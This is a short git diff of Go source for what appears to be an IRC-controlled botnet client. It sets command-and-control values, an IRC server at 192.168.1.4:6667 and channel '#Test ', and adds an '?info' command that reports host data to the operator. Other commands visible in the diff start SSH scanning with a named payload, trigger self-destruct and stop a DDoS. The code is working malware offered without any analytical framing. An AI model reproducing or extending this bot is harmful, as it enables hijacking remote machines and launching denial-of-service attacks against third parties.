@@ -17,10 +17,10 @@ import (
 //////////////////////////////////////////////////////////////////////////
 
 const (
-	IRC_Server        = "" //config IRC server and port here.
-	IRC_Channel       = "" //config channel here //should have space!!!
-	IRC_Chan_Password = "" //config channel password here.
-	Payload_Name      = "" //config payload name
+	IRC_Server        = "192.168.1.4:6667" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
+	IRC_Channel       = "#Test "           //config channel here //should have space!!! //"#Example "
+	IRC_Chan_Password = ""                 //config channel password here.
+	Payload_Name      = "payload"          //config payload name
 )
 
 //////////////////////////////////////////////////////////////////////////
@@ -99,6 +99,8 @@ func main() {
 				tools.Scan_Switch = false
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START SCANNING.")
 				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
+			} else if tools.IRC_Find(ircRead, "?info") {
+				tools.ReportInf(irc, IRC_Channel)
 			} else if tools.IRC_Find(ircRead, "?kill") {
 				selfDestruct()
 			} else if tools.IRC_Find(ircRead, "?stop.ddos") {
